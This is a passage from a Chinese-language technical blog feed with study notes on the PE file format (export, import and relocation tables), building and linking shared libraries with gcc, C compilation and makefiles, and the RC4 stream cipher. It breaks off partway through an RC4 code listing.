src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230821155734.png"></p><p>首先查到AddressOfNames的RVA为80D0，那么FOA是70D0，第一个成员80F8注意这是RVA，换算成FOA是70F8，对应可以看到“HookStart”，后面一个是8102,换算成FOA是7102，对应“Hookstop”</p><h4 id="AddressOfNamesOrdinals"><a href="#AddressOfNamesOrdinals" class="headerlink" title="AddressOfNamesOrdinals"></a>AddressOfNamesOrdinals</h4><p>导出函数序列号表。有几个根据函数名称导出的函数，该表就有几个成员。每个成员二字节大小。</p><p>这是一个API，它有两个参数，<strong>DLL的句柄</strong>就是该DLL在内存展开时的地址，<strong>函数名</strong></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230821163246.png"></p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230821163637.png"></p><p>当API通过函数名调用函数，比如说它调用了hookstart，那么它会前往函数名称列表获得hookstart的索引值0，之后会去序号列表，序号列表下标为零的值是0，拿到这个0再去函数地址列表充当索引最终找到函数的地址。有时候不是通过函数名而是通过函数序号查找函数，这就要用到刚才没介绍的一个成员Base,它的值是函数地址列表的起始序号，如果其实序号为10，所调用的函数的序号是11，那么第二个成员hookstop的序号对应为11，完成调用。</p><h3 id="导入表"><a href="#导入表" class="headerlink" title="导入表"></a>导入表</h3><p>导入几个模块就有几张导入表，每个表记录该模块的信息。</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822005247.png"></p><p>导入表信息位置：在扩展pe头的最后一个成员（结构体数组），该结构体数组的第二个成员记录着导入表信息。<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822003801.png"></p><p>两个成员分别是导入表的<strong>地址</strong>和导入表的<strong>大小</strong>。有没有指明导入表数量的成员？答案是没有，我们可以通过查看16进制数据判断，每个导入表的大小是20个字节，从起始位置划分每20字节一组，直到出现一组20字节全部为0即代表结束，从而可以判断数量。</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822010616.png"></p><h4 id="Name-2"><a href="#Name-2" class="headerlink" title="Name"></a>Name</h4><p>该成员是一个RVA，指向一个字符串，即该模块的名字。</p><h4 id="characteristic-x2F-originalfirstthunk"><a href="#characteristic-x2F-originalfirstthunk" class="headerlink" title="characteristic&#x2F;originalfirstthunk"></a>characteristic&#x2F;originalfirstthunk</h4><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822123240.png"></p><p>这个联合指向的是IMAGE_THUNK_DATA结构体，这些结构体组成<strong>INT（import name table）</strong>，要用到该模块的几个函数，就有几个IMAGE_THUNK_DATA结构体，每个结构体大小是4字节，当出现连续的4字节为0，则说明INT截止。</p><p>导入表的地址是6B24,6B24处的第一个成员的值是7b60,转换成foa是6b60，IMAGE_THUNK_DATA结构体就在6B60处</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822121355.png"></p><p>IMAGE_THUNK_DATA结构体：<img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822121737.png"></p><p>这个结构体看着很复杂，其实他只有一个四字节的成员，联合只是给这一个成员起了多个名字方便理解。</p><p>如果，IMAGE_THUNK_DATA第一位为1，则说明它是序号，是前面导出表提到的<strong>函数序号列表</strong>的内容，对应的是要导入的函数没有名字只提供了序号。</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822123421.png"></p><p>如果不为1，则是一个RVA，指向importbyname：该表仅三字节大小，如果第一个hint不为0，则说明是<strong>函数地址列表</strong>的序号。<strong>Name</strong>只有一个字节，显然不可能，因为函数的名称长度是不确定的，所以只记录它的第一个字符，遇到0则表示结束。</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822122250.png"></p><p>完整的理一遍，首先通过扩展pe头的左后一个成员import table找到了导入表，导入表的第四个成员是个RVA指向了kernel32.dll字符串,这是导入的模块的名称，通过导入表的第一个成员（一个RVA指向）IMAGE_THUNK_DATA，该成员的最高位不为1，说明是个RVA，通过这个RVA找到了importbyname，通过该成员的第三个字节找到了导入的这个模块所使用的一个函数GetModuleFileNameA</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822124731.png"></p><p>PE文件加载前后，IAT（import address table）导入地址表发生变化，IAT不在指向函数名称，而是已经根据函数名称更换了表格。INT那里相当于一层保险，当程序IAT被修改（脱壳时就要修复导入表），无法找到函数时，可以根据INT和相关函数得到函数地址，从而修复IAT。</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822154619.png"></p><h3 id="重定位表"><a href="#重定位表" class="headerlink" title="重定位表"></a>重定位表</h3><p><strong>重定位表的作用</strong>：如果可执行文件中的全部的地址相关的数值都是RVA即相对imagebase来的，那么重定位表可有可无。但是有的全局变量他的地址是硬编码，只有文件被加载到了内存中特定的位置在能正常使用，但是可执行文件往往要加载多个dll，原来那个位置可能已经被占了，这时候只能再选一个空闲的地址，此时imagebase就不是预期的值了，这种情况就要根据重定位表进行修改。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> x=<span class="number">0</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    x=<span class="number">11</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面的代码的汇编码如下，mov 【00427e34】，11h   由于全局变量使用了硬编码，显然只有加载的特定的位置该代码才能生效。</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230822161736.png"></p><p><strong>位置</strong>：还是在扩展PE头最后一个结构体数组，第六个成员。</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230823003816.png"></p><p><strong>成员：</strong> 根据名字就可以看出，第一个是地址，第二个是大小，不过这个大小，指的是该结构体的大小。</p><p><img src="/2023/08/23/PE%E6%96%87%E4%BB%B6%E5%AD%A6%E4%B9%A0%E7%AF%87/QQ%E6%88%AA%E5%9B%BE20230823004102.png"></p><p>上图代表的就是这个结构体，x表示第一个成员，y表示大小，第一个结构体的y为16，所以该结构体16字节大小，再往下就是下一个，下一个是20字节大小，再往下是12字节大小，当遇到连续的八个字节为0，也就是x和y都为0时，代表该表格结束。解释一下为什么要这样设计，其实这个表存放的是要进行重定位的成员的地址，X代表的相当于一个基地址，Y后的每一个成员即从第九个字节开始，每两个字节为一个成员，比如X的值为80 00 00 00,后面的字节为12，16，18，则代表         80 00 00 12、80 00 00 16、80 00 00 16需要进行重定位，可以看到存放一个实际的地址需要4个字节，存放10个是40字节，而我们采用基地址加偏移的方法只使用了24个字节，需要重定位的值越多，节省的空间就越多。（这个区块是根据内存页进行划分的，每个页4KB，每个页有一个重定位表，而两个字节的偏移地址能表示0~ffff，足够对一个页进行寻址，若要寻址至少需要12个位，一字节不够，所以选择二字节作为偏移地址的单位）。</p><p><strong>重点：</strong> Y后的成员，两字节即16位一组，其实表示有效地址的是低12位，高四位并非没有作用，当高四位位0011的时候，才代表该处的值需要进行修复，比如说第一个成员为0011 0011 1111 1111，前四位为0011，代表该成员需要被修复，取低12位加上X基地址即是真正需要修改的。若高4位不是0011，则该处数据无作用，可以理解为用来内存对齐的垃圾数据。</p><p>完结撒花了！！！！！！！！！！！！！！！！！！！！！！ hhh</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;在《逆向工程核心原理》这本书接触到了PE文件，但是当时学不进去，感觉很晦涩，虽然是一个结构体一个结构体的进行分析，但还是掌握不了。今天在YouTube上找到了一个视频，看了一下有种恍然大明白的感觉。正巧今天看了一期关于国产大飞机C919的视频很有感想，我们的策略是先整体后局部，即不过分死抠细节，不把国产化率排在首位，先造出来一个大飞机，于是我们就有了一张蓝图，知道方向在哪里。学习PE文件这里也是，先整体的过一遍，知道个轮廓，在学起来会容易和有趣不少。&lt;/p&gt;</summary>
    
    
    
    
    <category term="Windows" scheme="http://example.com/tags/Windows/"/>
    
    <category term="PE" scheme="http://example.com/tags/PE/"/>
    
  </entry>
  
  <entry>
    <title>动态链接库（DLL）及其工作原理</title>
    <link href="http://example.com/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/"/>
    <id>http://example.com/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/</id>
    <published>2023-08-21T03:51:39.000Z</published>
    <updated>2023-08-21T03:51:39.423Z</updated>
    
    <content type="html"><![CDATA[<h3 id="动态链接库"><a href="#动态链接库" class="headerlink" title="动态链接库"></a><strong>动态链接库</strong></h3><blockquote><p>动态链接库（Dynamic Link Library 或者Dynamic-link Library，缩写为DLL），<strong>是微软公司在微软Windows操作系统中，实现共享函数库概念的一种方式</strong>。 这些库函数的扩展名是”.dll、.ocx（包含ActiveX控制的库）或者.drv（旧式的系统驱动程序）。linux下的动态链接库后缀是so，即（shared object），共享对象。</p></blockquote><span id="more"></span><p>许多程序拥有相同的功能，如果程序都重复的包含这些代码，将浪费很多硬盘空间。<img src="/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/QQ%E6%88%AA%E5%9B%BE20230821102949.png"></p><p>程序1.exe 、2.exe 、3.exe有一段代码是相同的，那么我们可以将橙色这段代码从这三个程序中提取出来，保存成一个独立的动态链接库，等到程序运行的时候再将它们加载到内存。<img src="/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/QQ%E6%88%AA%E5%9B%BE20230821103253.png"></p><p>假设源程序每个都是100M，共享的这段是50M，那么之前占硬盘300M，使用动态连接后占200M。其实动态链接库不仅可以节约空间，还更加方便程序的升级和维护。</p><h3 id="创建动态链接库"><a href="#创建动态链接库" class="headerlink" title="创建动态链接库"></a><strong>创建动态链接库</strong></h3><p>创建matc.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>math.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br></pre></td></tr></table></figure><p>将math.c编译成一个动态库：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -shared -fPIC math.c -o libmath.so</span><br></pre></td></tr></table></figure><ul><li>-shared 选项是表明这是一个动态库</li><li>-fPIC 位置无关代码（后面会讲）</li><li>libmath.so是我们定义的名字</li></ul><p>主程序main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;math.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;add(1,2) return %d&quot;</span>,add(<span class="number">1</span>,<span class="number">2</span>));</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译整个程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc main.c -lmath -L. -o main</span><br></pre></td></tr></table></figure><ul><li>-l指定动态链接库math，math是libmath.so,省略了lib和so后缀</li><li>-L指定动态链接库所在的目录</li></ul><p>还不能直接运行程序</p><p><img src="/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/QQ%E6%88%AA%E5%9B%BE20230821105924.png"></p><p>会报错找不到动态链接库，这是因为linux默认回去系统路径下搜索动态库，我们使用环境变量，将当前目录添加到LD_LIBRARY_PATH环境变量中，这样操作系统就会先去我们指定的目录搜索，如果没有则会继续前往系统路径搜索。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export LD_LIBRARY_PATH=&quot;$(pwd)&quot;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/QQ%E6%88%AA%E5%9B%BE20230821110426.png"></p><p>成功！！！！ </p><p>动态链接区别于静态链接的一点是方便升级和维护，此时我们只需修改math.c重新编译libmath，即可更改程序功能,非常的方便。将math.c修改</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="built_in">printf</span>(<span class="string">&quot;you have changed the DLL\n&quot;</span>);</span><br><span class="line">   <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/QQ%E6%88%AA%E5%9B%BE20230821111411.png"></p><h3 id="动态链接与静态链接的区别"><a href="#动态链接与静态链接的区别" class="headerlink" title="动态链接与静态链接的区别"></a>动态链接与静态链接的区别</h3><p><strong>静态链接</strong>将所有用到的库和模块合并成一个独立的可执行文件，这一过程需要修复各个模块的函数跳转地址（重定位），因为在链接之前那些跳转地址不过是一堆占位符而已。</p><p><img src="/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/QQ%E6%88%AA%E5%9B%BE20230821112315.png"></p><p>对于 <strong>动态链接</strong> ，链接过程发生在程序加载时，在我们运行一个依赖动态链接库的程序，操作系统会首先将程序的数据、代码、连同用到的动态链接库<strong>递归的</strong>加载到内存，每个动态链接库的加载地址都是不固定的，操作系统会根据当前地址空间的使用情况为他们动态的分配一段内存。当动态链接库固定之后，就要进行修复函数的跳转地址，<img src="/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/QQ%E6%88%AA%E5%9B%BE20230821113103.png"></p><p>因为动态链接库位置是不固定的，所以我们不能直接修改代码段，如果这样的话我们需要在不同的进程中保存不同的副本，显然是不合理的。于是在数段预留了一片区域存放跳转地址，被称为GOT(全局偏移表)，在调用函数时首先会查表，然后根据表中的地址跳转，got的地址在动态链接库加载的时候会被修改为真正的地址，每个进程中的got都不相同，但是got所占用的空间很小可以忽略。这种方式被称为PIC（地址无关代码）。</p><p><img src="/2023/08/21/%E5%8A%A8%E6%80%81%E9%93%BE%E6%8E%A5%E5%BA%93%EF%BC%88DLL%EF%BC%89%E5%8F%8A%E5%85%B6%E5%B7%A5%E4%BD%9C%E5%8E%9F%E7%90%86/QQ%E6%88%AA%E5%9B%BE20230821114109.png"></p><h3 id="延迟绑定"><a href="#延迟绑定" class="headerlink" title="延迟绑定"></a>延迟绑定</h3><p>在程序运行的时候库中的很多函数都没有被调用，操作系统为了进一步的降低开销，不直接加载所有的函数，而是用到哪个函数的时候在进行查表搜索。</p><p><a href="https://www.youtube.com/watch?v=QUaSgq-ivbw">搬运的视频内容</a></p>]]></content>
    
    
    <summary type="html">&lt;h3 id=&quot;动态链接库&quot;&gt;&lt;a href=&quot;#动态链接库&quot; class=&quot;headerlink&quot; title=&quot;动态链接库&quot;&gt;&lt;/a&gt;&lt;strong&gt;动态链接库&lt;/strong&gt;&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;动态链接库（Dynamic Link Library 或者Dynamic-link Library，缩写为DLL），&lt;strong&gt;是微软公司在微软Windows操作系统中，实现共享函数库概念的一种方式&lt;/strong&gt;。 这些库函数的扩展名是”.dll、.ocx（包含ActiveX控制的库）或者.drv（旧式的系统驱动程序）。linux下的动态链接库后缀是so，即（shared object），共享对象。&lt;/p&gt;
&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="DLL" scheme="http://example.com/tags/DLL/"/>
    
  </entry>
  
  <entry>
    <title>C语言-链接与编译</title>
    <link href="http://example.com/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/"/>
    <id>http://example.com/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/</id>
    <published>2023-08-20T14:59:15.000Z</published>
    <updated>2023-08-20T15:00:53.682Z</updated>
    
    <content type="html"><![CDATA[<p><strong>编译</strong> </p><p>源文件生成目标文件的过程及main.c–main.o</p><span id="more"></span><p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818011918.png"></p><p><strong>链接</strong></p><p>目标文件生成可执行文件的过程及main.o–main。详细点说链接是将编译之后的所有目标文件连同用到的一些静态库、运行时库组件而拼装成一个可执行文件的过程。其中有地址修复的过程，如上图所示call后面的地址暂时被设置为0，修复时就是链接器根据目标文件或者静态库中的重定位表找到那些需要被重定位的函数和全局变量从而修正他们的地址。</p><p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818011750.png"></p><p>对于add.h 、add.c、main.c三个文件</p><p>add.h</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span>;</span><br></pre></td></tr></table></figure><p>add.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">add</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span> b)</span></span><br><span class="line">&#123;</span><br><span class="line">   <span class="keyword">return</span> a+b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>main.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;add.h&quot;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> a=<span class="number">5</span>;</span><br><span class="line">    <span class="type">int</span> b=<span class="number">10</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;a+b=%d\n&quot;</span>,addd(a,b));</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>编译器是完全不知道printf和add函数的存在的（位于哪个区块、函数的定义），因此编译器只能将两个函数的跳转先暂时设置为0.使用odjdump对目标文件进行反汇编</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -s -d main.o &gt; main.o.txt</span><br></pre></td></tr></table></figure><p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818013635.png"></p><p>这里的0会在后面链接的时候被修正</p><p>查看目标文件的重定位信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -r main.o</span><br></pre></td></tr></table></figure><p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818014305.png"></p><p>函数add、printf的偏移量分别为25、3b。</p><p>一直手工编译显然效率不高，学习了一点makefile的知识</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim makefile</span><br></pre></td></tr></table></figure><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">all:main</span><br><span class="line">main:main.o add.o</span><br><span class="line">        gcc main.o add.o -o main</span><br><span class="line">main.o:main.c</span><br><span class="line">        gcc -c main.c</span><br><span class="line">add.o:add.c</span><br><span class="line">        gcc -c add.c</span><br><span class="line">clean:</span><br><span class="line">        rm main main.o add.o</span><br></pre></td></tr></table></figure><p>然后make main即可，他会自动根据依赖树递归地去构建可执行文件main</p><p><img src="/2023/08/20/C%E8%AF%AD%E8%A8%80-%E9%93%BE%E6%8E%A5%E4%B8%8E%E7%BC%96%E8%AF%91/QQ%E6%88%AA%E5%9B%BE20230818020241.png"></p><p>参考：<a href="https://www.youtube.com/watch?v=1IIUvVrCSF0">https://www.youtube.com/watch?v=1IIUvVrCSF0</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;strong&gt;编译&lt;/strong&gt; &lt;/p&gt;
&lt;p&gt;源文件生成目标文件的过程及main.c–main.o&lt;/p&gt;</summary>
    
    
    
    
    <category term="C语言" scheme="http://example.com/tags/C%E8%AF%AD%E8%A8%80/"/>
    
  </entry>
  
  <entry>
    <title>RC4</title>
    <link href="http://example.com/2023/08/20/RC4/"/>
    <id>http://example.com/2023/08/20/RC4/</id>
    <published>2023-08-20T03:42:40.000Z</published>
    <updated>2023-08-20T03:42:40.660Z</updated>
    
    <content type="html"><![CDATA[<p>题目中也遇到过很多次RC4了，一般是都是从加密函数的名字看出，现在学习一下，了解其特征，更方便识别出。</p><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>RC4是<strong>对称密码</strong>算法中的<strong>流密码</strong>加密算法，对称及加解密的密钥相同，流密码意思是加密是逐字节进行的与之对应的就是<strong>块加密</strong>。</p><span id="more"></span><h2 id="算法原理"><a href="#算法原理" class="headerlink" title="算法原理"></a>算法原理</h2><p>RC4生成一种称为密钥流的伪随机流（S表），他与明文通过异或操作混合，以达到加密的目的，解密时与明文进行异或操作。其密钥流由两部分组成，分别是KSA和PRGA。可以简单的理解为RC4由这两部分组成。</p><p><strong>KSA</strong> 部分的代码。密钥的长度一般为5<del>16字节及40</del>128位，通常不超过256位。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    S[i]=i;       <span class="comment">//用0~255初始化S数组</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> j=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;<span class="number">256</span>;i++)</span><br><span class="line">&#123;</span><br><span class="line">    j=(j+S[i]+key[i % keylength]) % <span class="number">256</span>;  <span class="comment">//使用密钥进行替换</span></span><br><span class="line">    Swap(S[i],S[j]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>PRGA</strong> 根据待加密的data进行置换，得到的子密码k与data进行异或即可得到密文</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">i,j,t=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span>(m=<span class="number">0</span>;j&lt;datalength;m++)</span><br><span class="line">&#123;</span><br><span class="line">    i=(i+<span class="number">1</span>)%<span class="number">256</span>;</span><br><span class="line">    j=(j+S[i])%<span class="number">256</span>;</span><br><span class="line">    Swap(S[i],S[j]);</span><br><span class="line">    t=(S[i]+S[j])%<span class="number">256</span>;</span><br><span class="line">    k=S[t];</span><br><span class="line">    data[m]^=k;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>合并起来的代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">Swap</span><span class="params">(<span class="type">int</span>*a,<span class="type">int</span>*b)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> t=<span class="number">0</span>;</span><br><span class="line">    t=*a;</span><br><span class="line">    *a=*b;</span><br><span class="line">    *b=t;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">char</span> key[]=<span class="string">&quot;fishjump&quot;</span>;</span><br><span class="line">    <span class="type">int</span> keylength=<span 